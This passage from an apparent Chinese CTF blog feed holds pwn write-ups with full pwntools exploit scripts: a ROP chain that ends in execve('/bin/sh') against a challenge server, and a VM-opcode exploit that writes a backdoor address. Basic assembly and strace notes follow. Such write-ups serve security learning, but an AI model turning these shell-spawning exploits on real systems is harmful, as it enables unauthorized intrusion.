PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h3 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h3><p>_start:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">start</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> **v2; <span class="hljs-comment">// [rsp+0h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">void</span> *retaddr; <span class="hljs-comment">// [rsp+8h] [rbp+0h] BYREF</span><br><br>  print(a1, msg1, <span class="hljs-number">0x17Bu</span>LL);<br>  v2 = &amp;retaddr;<br>  print(a1, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v2, <span class="hljs-number">8uLL</span>);<br>  print(a1, msg2, <span class="hljs-number">0x235u</span>LL);<br>  v1 = sys_read(<span class="hljs-number">0</span>, (<span class="hljs-type">char</span> *)&amp;v2, <span class="hljs-number">0x539u</span>LL);<br>  __asm &#123; jmp     [rsp+<span class="hljs-number">8</span>+var_8] &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python3">#! /usr/bin/python3<br>from pwn import *<br>#pyright: reportUndefinedVariable=false<br><br>context.os = &#x27;linux&#x27;<br>context.arch = &#x27;amd64&#x27;<br># context.log_level = &#x27;debug&#x27;<br>context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]<br><br>elf=ELF(&quot;./attachment&quot;)<br># libc=ELF(&quot;./libc.so.6&quot;)<br><br>debug = 1<br><br>if debug:<br>    io = process(&#x27;./attachment&#x27;)<br>    #io = remote(&#x27;0.0.0.0&#x27;,9999)<br>else:<br>    io = remote(&#x27;222.67.132.186&#x27;,25608)<br><br>def p():<br>    gdb.attach(proc.pidof(io)[0])<br><br># p()<br># b *0x401079<br><br># 0x0000000000401018 : pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br># 0x0000000000401021                 xor     rdx, rdx  ; jmp     r15<br># 0x000000000040101f : jmp rdi<br># 0x0000000000401017 : pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br># 0x000000000040101a : pop r13 ; pop r15 ; jmp r15<br># 0x000000000040100C                 xchg    rax, r13<br># 0x401077   syscall ; jmp [rsp]<br># 0x000000000040101c : pop r15 ; jmp r15<br># 0x000000000040101b : pop rbp ; pop r15 ; jmp r15<br># 0x0000000000401011 :  add     rbx, 8  ; jmp qword ptr [rbx]<br># 0x401027                 xor     rsi, rsi  ; jmp     r15<br># read<br>payload=p64(0x40101a)+p64(0x401017)<br>payload+=p64(0x402800)+p64(0)+p64(0x402800)+p64(0)+p64(0x40100C)<br>payload+=p64(0x40101b)+p64(0x401077)<br>payload+=p64(0x401017)+p64(0x402800)+p64(0x402800)+p64(59)+p64(0x401011)+p64(0X40100A)<br>io.sendline(payload)<br># p()<br># sleep(0.5)<br>io.sendline(b&#x27;/bin/sh\x00&#x27;+p64(0X401021)+p64(0x401027)+p64(0x401027)+p64(0x40100C))<br>io.interactive()<br></code></pre></td></tr></table></figure><p>第一次送入payload的流程：</p><table><thead><tr><th align="center">high_addr</th></tr></thead><tbody><tr><td align="center">0X40100A  [ syscall                 ; LINUX - sys_write ]</td></tr><tr><td align="center">0x401011  [  add     rbx, 8  ; jmp qword ptr [rbx] ]</td></tr><tr><td align="center">59</td></tr><tr><td align="center">0x402800  [ bss段 ]</td></tr><tr><td align="center">0x402800  [ bss段 ]</td></tr><tr><td align="center">0x401017 [ pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15 ]</td></tr><tr><td align="center">0x401077  [ syscall ; jmp [rsp] ]</td></tr><tr><td align="center">0x40101b [ pop rbp ; pop r15 ; jmp r15 ]</td></tr><tr><td align="center">0x40100C [   xchg    rax, r13 ]</td></tr><tr><td align="center">0</td></tr><tr><td align="center">0x402800 [ bss段 ]</td></tr><tr><td align="center">0</td></tr><tr><td align="center">0x402800 [ bss段 ]</td></tr><tr><td align="center">0x401017  [ pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15 ]</td></tr><tr><td align="center">0x40101a  [ pop r13 ; pop r15 ; jmp r15 ]</td></tr><tr><td align="center"><strong>low_addr</strong></td></tr></tbody></table><p><strong>payload1构造的核心思想其实就是系统调用，过程中语句繁杂，只有一部分是我们需要的，或者有一些是用来当作中间媒介的</strong></p><p><strong>程序劫持后的运行流程</strong></p><p>**1.**根据ida的结果可知  jmp     [rsp+8+var_8]，跳转到esp所指向的地址</p><p>**2.**跳转到[esp]后执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop r13 ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure><p>各个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 0x40101a<br>r15: 0x401017<br>rsp: stack_addr_0x402800<br></code></pre></td></tr></table></figure><p>**3.**跳转到[r15]后执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure><p>各个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 0 <br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x40100C<br>rsp: stack_addr_0x40101b<br></code></pre></td></tr></table></figure><p>**4.**跳转到0x40100C后执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xchg    rax, r13<br></code></pre></td></tr></table></figure><p>根据IDA的查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040100E                 jmp     qword ptr [rsp+0]<br></code></pre></td></tr></table></figure><p>各个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: some_value<br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x40100C<br>rsp: stack_addr_0x40101b<br>rax: 0<br></code></pre></td></tr></table></figure><p>**5.**跳转到0x40101b后执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rbp ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure><p>各个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: some_value<br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x401077<br>rsp: stack_addr_0x401017<br>rax: 0<br>rbp: 0x40101b<br></code></pre></td></tr></table></figure><p>**6.**跳转到0x401077后执行如下命令，触发系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">syscall ; jmp [rsp]<br></code></pre></td></tr></table></figure><p>各个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: some_value<br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x401077<br>rsp: stack_addr_0x401017<br>rax: 0<br>rbp: 0x40101b<br>rdx: 0x539<br></code></pre></td></tr></table></figure><p>rax为0，出发系统调用sys_read</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#第一个参数存储在rdi,是文件描述符fd<br>#第二个参数存储在rsi,表示缓冲区地址，也就是buf<br>#第三个参数存储在rdx,表示要读取的字节<br></code></pre></td></tr></table></figure><p>由于程序劫持后一直没修改过rdx的值寄存器的值，所以edx的值由源_start函数中的语句决定，相关部分如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401033 &lt;+0&gt;:     movabs rsi,0x402000<br>0x000000000040103d &lt;+10&gt;:    mov    edx,0x17b<br>0x0000000000401042 &lt;+15&gt;:    call   0x401000 &lt;print&gt;<br>0x0000000000401047 &lt;+20&gt;:    push   rsp<br>0x0000000000401048 &lt;+21&gt;:    mov    rsi,rsp<br>0x000000000040104b &lt;+24&gt;:    mov    edx,0x8<br>0x0000000000401050 &lt;+29&gt;:    call   0x401000 &lt;print&gt;<br>0x0000000000401055 &lt;+34&gt;:    movabs rsi,0x40217b<br>0x000000000040105f &lt;+44&gt;:    mov    edx,0x235<br>0x0000000000401064 &lt;+49&gt;:    call   0x401000 &lt;print&gt;<br>0x0000000000401069 &lt;+54&gt;:    xor    rax,rax<br>0x000000000040106c &lt;+57&gt;:    xor    rdi,rdi<br>0x000000000040106f &lt;+60&gt;:    mov    rsi,rsp<br>0x0000000000401072 &lt;+63&gt;:    mov    edx,0x539<br>0x0000000000401077 &lt;+68&gt;:    syscall<br>0x0000000000401079 &lt;+70&gt;:    jmp    QWORD PTR [rsp]<br></code></pre></td></tr></table></figure><p>**7.**跳转到0x401017后执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure><p>各个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 59<br>rsi: 0x401017<br>rdi: 0x402800<br>rbx: 0x402800<br>r15: 0x401011<br>rsp: stack_addr_0x40100A<br>rax: 0<br>rbp: 0x40101b<br>rdx: 0x539<br></code></pre></td></tr></table></figure><p>**8.**跳转到0x401011后执行如下命令，触发系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">syscall                 ; LINUX - sys_write<br></code></pre></td></tr></table></figure><p>各个寄存器的值并未发生改变</p><p>rax为0，触发系统调用sys_read</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#第一个参数存储在rdi,是文件描述符fd<br>#第二个参数存储在rsi,表示缓冲区地址，也就是buf<br>#第三个参数存储在rdx,表示要读取的字节<br></code></pre></td></tr></table></figure><p><strong>这个时候相当于开始向bss段写入内容，并且开始控制程序getshell，也就有了payload2的构造</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">io.sendline(b&#x27;/bin/sh\x00&#x27;+p64(0X401021)+p64(0x401027)+p64(0x401027)+p64(0x40100C))<br></code></pre></td></tr></table></figure><p>先写入&#x2F;bin&#x2F;sh字符做准备，’\x00’用于结束读取</p><p>0x401027：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rsi, rsi  ; jmp     r15<br></code></pre></td></tr></table></figure><p>基本作用就是清空rsi，跳转到[r15]去</p><p>0x401011：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add     rbx, 8  ; jmp qword ptr [rbx]<br></code></pre></td></tr></table></figure><p>加完之后rbx的值为0x402808，这个位置存放的就是0x401021</p><p>0x401021:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rdx, rdx<br>jmp     r15<br></code></pre></td></tr></table></figure><p>清空rdx，跳转到[r15]指向的位置也就是0x401011</p><p>再向后加8位，并跳转到这个位置，循环往复后跳转到0x40100C</p><p>0x40100C的内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040100C                 xchg    rax, r13<br>.text:000000000040100E                 jmp     qword ptr [rsp+0]<br></code></pre></td></tr></table></figure><p>最后再次跳转到[rsp]指向的地址</p><p>再次触发系统调用;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">syscall<br></code></pre></td></tr></table></figure><p>这时的寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 0<br>rsi: 0<br>rdi: 0<br>rbx: 0x402820<br>r15: 0x401011<br>rsp: stack_addr_0x40100A<br>rax: 59<br>rbp: 0x40101b<br>rdx: 0<br></code></pre></td></tr></table></figure><p>这时的rax的值为59，系统调用为execve()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#第一个参数为程序路径，指向可执行文件,存储在rdi中<br>#第二个参数为参数数组，指向程序的参数列表，存储在rsi中<br>#第三个参数为环境变量参数，指向程序的环境变量列表，存储在rdx中<br></code></pre></td></tr></table></figure><p>这时设置的参数数组只有一个元素，设置为0，环境变量数组设置为0，最后成功getshell</p><h2 id="my-vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h2><h3 id="题目附件送的gift图片"><a href="#题目附件送的gift图片" class="headerlink" title="题目附件送的gift图片"></a>题目附件送的gift图片</h3><p><img src="/../00000000/image-20250307095338336.png" alt="image-20250307095338336"></p><h3 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/vm$ checksec my_vm<br>[*] &#x27;/mnt/d/111/vm/my_vm&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)<br># libc = ELF(&#x27;./libc.so&#x27;)<br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br>context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]<br><br># io = process(&#x27;./my_vm&#x27;)<br>io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28171)<br><br>def p():<br>    gdb.attach(proc.pidof(io)[0], &quot;b *0x400b39&quot;)<br><br>io.recvuntil(&quot;set your IP:&quot;)<br>io.sendline(&quot;0&quot;)<br><br>io.recvuntil(&quot;set your SP:&quot;)<br>io.sendline(&quot;1&quot;)<br><br>backdoor = 0x400877<br><br># p()<br>cnt = 16<br>payload  = str(0x10000000) + &quot;\n&quot;;<br>payload += str(0x10010001) + &quot;\n&quot;;<br><br>payload += str(0x10030877) + &quot;\n&quot; # mov r3, 0x0877<br>payload += str(0x10040040) + &quot;\n&quot; # mov r4, 0x0040<br><br>payload += str(0x50020001) + &quot;\n&quot;; # r2 -1<br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -2<br><br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -3<br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -4<br><br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -5<br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -6<br><br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -7<br>payload += str(0x50020201) + &quot;\n&quot;; # r2 -8<br><br>payload += str(0x10050010) + &quot;\n&quot;; # mov r5 0x10<br>payload += str(0x80040405) + &quot;\n&quot;; # r4 &lt;&lt; 16<br><br>payload += str(0x40030304) + &quot;\n&quot;; # add r3, r4<br>payload += str(0x90020300) + &quot;\n&quot;; # mov [r2], r3<br><br><br>io.recvuntil(&quot;How much code do you want to execve:&quot;)<br>io.sendline(str(cnt))<br><br># p()<br><br>sleep(1)<br><br>io.send(payload)<br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Computing 101</title>
    <link href="/Computing%20101/"/>
    <url>/Computing%20101/</url>
    
    <content type="html"><![CDATA[<h1 id="Computing-101"><a href="#Computing-101" class="headerlink" title="Computing 101"></a>Computing 101</h1><h3 id="Your-First-Program"><a href="#Your-First-Program" class="headerlink" title="Your First Program"></a>Your First Program</h3><p>1.学习了汇编指令mov，给寄存器赋值</p><p>2.系统调用syscall，系统调用的情况由对应的ax寄存器的值确定</p><p>3.系统调用参数传递，rdi转递第一个参数</p><p>4.构建一个二进制文件</p><ol><li>step_1: 用.s语法写一个文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.intel_syntax noprefix#告诉编译器使用的intel语法，不需要在每条命令前都加上额外的前缀<br>mov rdi, 42<br>mov rax, 60<br>syscall<br></code></pre></td></tr></table></figure><ol start="2"><li>step_2: 用as命令将二进制文件组装成可执行的对象文件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ ls<br>asm.s<br>hacker@dojo:~$ cat asm.s<br>.intel_syntax noprefix<br>mov rdi, 42<br>mov rax, 60<br>syscall<br>hacker@dojo:~$ as -o asm.o asm.s<br>hacker@dojo:~$ ls<br>asm.o   asm.s<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure><p>as工具读取asm.s文件，将其汇编成二进制代码，并输出一个名为asm.o的对象文件，它包含了实际的汇编二进制代码，但是还不能直接运行，我们要将它链接起来</p><ol start="3"><li>step_3: 使用ld命令将一个或多个可执行的对象文件链接成最终的可执行文件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ ls<br>asm.o   asm.s<br>hacker@dojo:~$ ld -o exe asm.o<br>ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000<br>hacker@dojo:~$ ls<br>asm.o   asm.s   exe<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure><p>这时已经创建了一个名为exe的可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">这里的第三步可以看到有一个没找到_start symbol的标识</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">在代码中没有设定_start标识程序就会从最开始开始执行</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">所以我们可以修改成如下代码，就可以避免报错的弹出</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.intel_syntax noprefix<br>.global _start<br>_start:<br>mov rdi, 42<br>mov rax, 60<br>syscall<br></code></pre></td></tr></table></figure><p>其实就是多了两行，第二行是添加了 _start的标签,指向代码的开头，第一行的.global _start指示链接器将 _start标签设置为全局可见，而不仅仅是对象文件级局部可见</p><p>由于 <code>ld</code> 是链接器，这个指令对于 <code>_start</code> 标签被识别是必要的</p><p>5.就是详细介绍了mov，也可以在两个寄存器之间使用</p><h3 id="Software-Introspection"><a href="#Software-Introspection" class="headerlink" title="Software Introspection"></a>Software Introspection</h3><p>1.strace 系统调用追踪器</p><p>范例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ strace /tmp/your-program<br>execve(&quot;/tmp/your-program&quot;, [&quot;/tmp/your-program&quot;], 0x7ffd48ae28b0 /* 53 vars */) = 0<br>exit(42)                                 = ?<br>+++ exited with 42 +++<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure><p>strace 指明了触发了什么系统调用，传递的参数是什么</p><p>输出语法为system_call(parameter,parameter,parameter…….)</p><p>例子中报告了两个系统调用，第二个是程序请求终止自生的exit的系统调用，你可以看到给它传递的参数42，一个是execve的系统调用，它启动一个新程序，但是并不是由这个程序调用的，strace检测到它是由于strace的独特工作机制导致的</p><p>最后可以看到exit(42)，以退出码42退出！</p><p>exit的系统调用很容易在不使用strace的条件下使用，因为exit的一个目的就是像你提供一个你可以访问的退出码</p><p>这道题目strace的是alarm</p><p>2.gdb的启动</p><p>3.gdb的指令：starti启动程序</p><h3 id="Computer-Memory"><a href="#Computer-Memory" class="headerlink" title="Computer Memory"></a>Computer Memory</h3><p>1.[addr]标识地址的内容</p><p>2.巩固联系</p><p>3.寄存器中存地址并访问获取该地址的值</p><p>4.访问寄存器中的地址的一定偏移量的值</p><p>5.解指针的一些操作，具体如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.intel_syntax noprefix<br>.global _start<br>_start:<br>mov rdi, [567800]<br>mov rdi, [rdi]<br>mov rax, 60<br>syscall<br></code></pre></td></tr></table></figure><p>6.综合运用</p><p>7.寄存器三重解引用</p><h3 id="Hello-Hackers"><a href="#Hello-Hackers" class="headerlink" title="Hello Hackers"></a>Hello Hackers</h3><p>1.write的系统调用</p><p>参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">write(file_descriptor, memory_address, number_of_characters_to_write)<br></code></pre></td></tr></table></figure><p>参数传递：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rdi:file_descriptor<br>rsi:memory_address<br>rdx:number_of_characters_to_write<br></code></pre></td></tr></table></figure><p>文件描述符回顾：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">FD 0：标准输入是进程接收输入的通道。例如，你的 shell 使用标准输入来读取你输入的命令。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">FD 1：标准输出是进程输出正常数据的通道，比如在之前的挑战中打印给你的标志，或者像 <span class="hljs-built_in">ls</span> 这样的工具的输出。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">FD 2：标准错误是进程输出错误信息的通道。例如，如果你输入了一个错误的命令，shell 会通过标准错误输出“该命令不存在”的信息。</span><br></code></pre></td></tr></table></figure><p>2.多次系统调用</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.intel_syntax noprefix<br>.global _start<br>_start:<br>mov rdi, 1<br>mov rsi, 1337000<br>mov rdx, 1<br>mov rax, 1<br>syscall<br>mov rdi, 42<br>mov rax, 60<br>syscall<br></code></pre></td></tr></table></figure><p>4.read的系统调用</p><p>答案;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 